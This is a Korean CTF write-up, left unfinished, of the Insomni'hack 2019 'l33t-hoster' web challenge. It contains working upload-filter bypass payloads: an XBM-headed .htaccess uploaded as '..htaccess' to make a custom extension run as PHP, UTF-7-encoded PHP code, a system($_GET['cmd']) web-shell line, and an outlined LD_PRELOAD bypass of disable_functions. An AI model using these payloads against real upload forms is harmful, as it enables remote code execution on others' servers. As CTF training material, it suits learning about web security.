---
title: "[Insomni'hack 2019] l33t-hoster Write up(미완성)"
date: 2019-01-24
draft: false
category: [ctf]
subcategories: [2019]
tags: [Write-up, CTF, insomnihack2019]
---

이번에는 Insomni'hack teaser에 출제 된 l33t-hoster 문제의 풀이를 적어보려 한다.
공교롭게도 문제를 풀다가 서버가 닫혀버려서 끝까지 풀진 못했다. ㅠㅠ  

<!--more-->

문제 정보는 다음과 같다.  

```plain
You can host your l33t pictures here.
```

홈페이지에 접속하면 아래와 같이 파일을 올릴 수 있는 페이지를 확인할 수 있다.  

![](/images/CTF/insomnihack2019/l33t-hoster/l33t_01.png)  

파일 업로드를 하라고 하니 딱 웹 쉘 같은 것을 업로드 해야 할 것 같은 느낌이다.
그런데 소스코드를 확인 해 보면 아래에 주석으로 `/?source`라고 적힌 부분이 있다.  

```html
<h3>Your <a href=images/a5d610a9bfe3775f2234f376f58a0cc404663bae/>files</a>:</h3><ul></ul>
<h1>Upload your pics!</h1>
<form method="POST" action="?" enctype="multipart/form-data">
    <input type="file" name="image">
    <input type="submit" name=upload>
</form>
<!-- /?source -->
```

친절하게 소스코드를 제공 해 주었다.
소스코드는 다음과 같았다

```php
<?php
if (isset($_GET["source"])) 
    die(highlight_file(__FILE__));

session_start();

if (!isset($_SESSION["home"])) {
    $_SESSION["home"] = bin2hex(random_bytes(20));
}
$userdir = "images/{$_SESSION["home"]}/";
if (!file_exists($userdir)) {
    mkdir($userdir);
}

$disallowed_ext = array(
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "pht",
    "phtm",
    "phtml",
    "phar",
    "phps",
);


if (isset($_POST["upload"])) {
    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
        die("yuuuge fail");
    }

    $tmp_name = $_FILES["image"]["tmp_name"];
    $name = $_FILES["image"]["name"];
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }

    if (count($parts) === 0) {
        die("lol filename is empty");
    }

    if (in_array($ext, $disallowed_ext, TRUE)) {
        die("lol nice try, but im not stupid dude...");
    }

    $image = file_get_contents($tmp_name);
    if (mb_strpos($image, "<?") !== FALSE) {
        die("why would you need php in a pic.....");
    }

    if (!exif_imagetype($tmp_name)) {
        die("not an image.");
    }

    $image_size = getimagesize($tmp_name);
    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {
        die("lol noob, your pic is not l33t enough");
    }

    $name = implode(".", $parts);
    move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
}

echo "<h3>Your <a href=$userdir>files</a>:</h3><ul>";
foreach(glob($userdir . "*") as $file) {
    echo "<li><a href='$file'>$file</a></li>";
}
echo "</ul>";

?>

<h1>Upload your pics!</h1>
<form method="POST" action="?" enctype="multipart/form-data">
    <input type="file" name="image">
    <input type="submit" name=upload>
</form>
<!-- /?source -->
```

파일을 업로드 할 수 있긴 한데 제약조건이 너무 많다.  

정리 해 보면 다음과 같다.  

* 파일 명에서 . 앞에 아무런 문자도 없으면 안된다. 즉, .htaccess는 . 뒤의 부분만 있기 때문에 업로드 할 수 없다.  
* $disallowed_ext에 있는 확장자는 업로드 할 수 없다.  
* 파일의 내용에는 <?가 들어있을 수 없다.  
* 업로드 한 파일은 exif_imagetype 함수에서 검사하는 이미지 형식 중 하나여야 한다.  
* 업로드 한 파일의 가로, 세로 크기는 1337이어야 한다.  

이 모든 조건을 통과하면 `images/RANDOM_BYTES/FILENAME.EXT`의 경로에 파일이 업로드 된다.
그럼 일단 파일 업로드 기능이 있으므로 `RCE(Remote Code Execution)`을 하기 위해 `php` 파일을 업로드 하면 문제를 쫘라락 풀 수 있을 것 같다.
그런데 `php` 확장자를 비롯해서 php 코드를 실행할 수 있는 거의 모든 확장자(일단 내가 생각할 땐 전부인 것 같은데, 혹시 어디서 뭐가 나올지 모르므로 거의 모든이라고 쓴다.)는 `$disallowed_ext` 변수 안에 들어있다.
그렇다면 다른 확장자를 업로드 하더라도 php가 실행할 수 있도록 만들면 될 것 같다 ㅎㅎ

이를 위해서 `.htaccess`를 업로드 해야한다.
그런데 앞서 말했듯이, `.` 앞에 아무런 문자도 없다면 업로드 할 수 없다.
이에 소스코드를 다시 살펴보면 아래와 같은 부분을 확인할 수 있다.  

```php
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }
```

즉, 만약에 파일 명을 `..htaccess`라고 하면, `array_shift` 한 결과가 아래와 같이 나온다.  

```plain
Array
(
    [0] => 
)
```

때문에 `count($parts)`는 1이 되어 `if(count($parts) === 0)` 부분을 그냥 지나쳐갈 수 있다.
또한 파일을 업로드 할 때, `$name.".".$ext` 형태로 하는데, `$name`은 `$_FILES["image"]["name"];`이기 때문에 빈 값이 될 것이고, `$ext`는 `array_pop($parts);`이기 때문에 `$parts`의 마지막 값인 `htaccess`가 되어 최종적으로 `.htaccess`의 이름으로 업로드 될 것이다.  

그러면 이제 아래와 같이 `.htaccess` 파일을 구성하여 업로드 하면, 내가 원하는 `aaa`라는 확장자를 `php`로 실행시킬 수 있게 될 것이다.  

```plain
AddType application/x-httpd-php .aaa
```

그런데 한가지 더 문제가 있었다.
바로 위의 파일을 업로드 했을 때, `exif_imagetype()`를 통과한 결과 유효한 이미지의 값을 반환 해 주어야 한다는 것이다.  

그렇다면 파일의 헤더를 이미지 파일처럼 맞춰주면 될 것 같은데, 지금 업로드 하는 파일은 `.htaccess`로 사용되어야 하기 때문에 `.htaccess`을 해석할 때는 무시될 수 있는 이미지 파일 헤더를 찾아야 한다.
일단 `exif_imagetype()` 함수에서 유효한 이미지로 취급하는 형태는 [여기](http://php.net/manual/en/function.exif-imagetype.php)에서 확인할 수 있다.
익숙한 형태가 보이는데 그 중, `IMAGETYPE_XBM`를 [위키피디아](https://en.wikipedia.org/wiki/X_BitMap#Format)에서 찾아보면 아래와 같은 부분을 확인할 수 있다.  

### Format
XBM files differ markedly from most image files in that they take the form of C source files. This means that they can be compiled directly into an application without any preprocessing steps, but it also makes them far larger than their raw pixel data. The image data is encoded as a comma-separated list of byte values, each written in the C hexadecimal notation, '0x13' for example, so that multiple ASCII characters are used to express a single byte of image information.[4]

XBM data consists of a series of static unsigned char arrays containing the monochrome pixel data. When the format was in common use, an XBM typically appeared in headers (.h files) which featured one array per image stored in the header. The following piece of C code exemplifies an XBM file:

```plain
#define test_width 16
#define test_height 7
static char test_bits[] = {
0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
0x00, 0x60 };
```

즉, 파일의 시작은 `#`으로 시작하며, 내가 파일의 width와 height도 설정할 수 있다.
그런데 `#` 뒤의 문자열은 `.htaccess`에서 주석으로 해석한다.  

따라서 `.htaccess` 파일 상단에 `xbm` 파일처럼 `width`와 `height`의 크기를 설정 해 준다면, `exif_imagetype()`도 통과하고, 마지막에 이미지의 가로와 세로의 길이가 `1337` 이어야 하는 조건문을 통과하면서 `.htaccess`에서는 해당 줄을 주석으로 처리 해 무시하게 될 것이다.
이 내용들을 바탕으로 다시 `.htaccess` 파일의 내용을 구성하면 다음과 같다.  

```plain
#define test_width 1337
#define test_height 1337

AddType application/x-httpd-php .aaa
```

다 된 것 같았는데 또 하나의 문제점이 있었다.
바로 `<?`를 사용할 수 없다는 점이었다.
그래서 `.htaccess`에 대해서 검색하다가 인터넷에서 [htaccess 치트엔진](https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet)을 찾을 수 있었다.
나는 여기에서 아래와 같은 부분을 사용하기로 했다.

![](/images/CTF/insomnihack2019/l33t-hoster/l33t_02.png)  

그래서 변경 한 `.htaccess`는 다음과 같다.  

* .htaccess (업로드 할 때는 ..htaccess)
```plain
#define test_width 1337
#define test_height 1337
AddType application/x-httpd-php .aaa
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```

그럼 이제 새로운 `.aaa` 파일을 업로드 하는데, 코드의 내용을 `UTF-7`로 인코딩 해 업로드 하면 아마 자동으로 `UTF-7` 디코딩을 하여 실행할 수 있을 것이다.
`code.aaa`라는 파일을 아래와 같이 만들었다.  

* code.aaa (원본)
```plain
#define test_width 1337
#define test_height 1337
<? phpinfo();
```

* code.aaa (UTF-7 버전)
```plain
#define test_width 1337
#define test_height 1337
+ADw?php phpinfo()+ADs-
```

`UTF-7 인코딩`은 [여기](http://toolswebtop.com/text/process/encode/utf-7)에서 했다.
파일 두개를 업로드 한 결과 아래와 같이 드디어 `phpinfo()`를 실행할 수 있었다!  

![](/images/CTF/insomnihack2019/l33t-hoster/l33t_03.png)  

그래서 그냥 `code.aaa`에 `<?php system($_GET['cmd']);`를 넣으면 되지 않을까 했는데 안되더라...
`phpinfo()`에서 다시 보니까 `disable_functions`에 system 부터 시작해서 코드를 실행할 수 있는 함수들이 다 들어가있다. (눙물...)  

![](/images/CTF/insomnihack2019/l33t-hoster/l33t_04.png)  

그래서 인터넷을 뒤지다 한 가지 방법을 찾았는데, 바로 `mail()` 함수와 `putenv()` 함수를 이용 해 `.so` 파일을 업로드 하여 실행시키는 것이다.  

> [How to bypass disable_functions and open_basedir](https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/)  

같은 내용인데 중국어로 적힌 [블로그 글](https://www.freebuf.com/articles/web/192052.html)도 있었다. 여기가 소스코드는 더 깔끔하게 있는 것 같다.
`php`에서 `mail()` 함수를 실행할 때, `execve` 함수를 호출한다고 한다.
때문에 내가 만약 `.so` 파일을 업로드 하고, `putenv()`를 통해 `LD_PRELOAD`를 내가 업로드 한 `.so` 파일로 변경할 수 있다면, 원하는 명령어를 실행할 수 있게 된다.  

근데... 여기까지 하고 급한 일을 해결하고 보니 서버가 닫혔다... ㅠㅠ
그냥 급한 일을 미뤄두고 문제부터 풀 걸 그랬다 ㅠㅠ
만약 나중에 기회가 된다면 이 내용을 실습해서 따로 올리는 것으로 하고 이 Write up은 여기까지만 해야할 것 같다.  
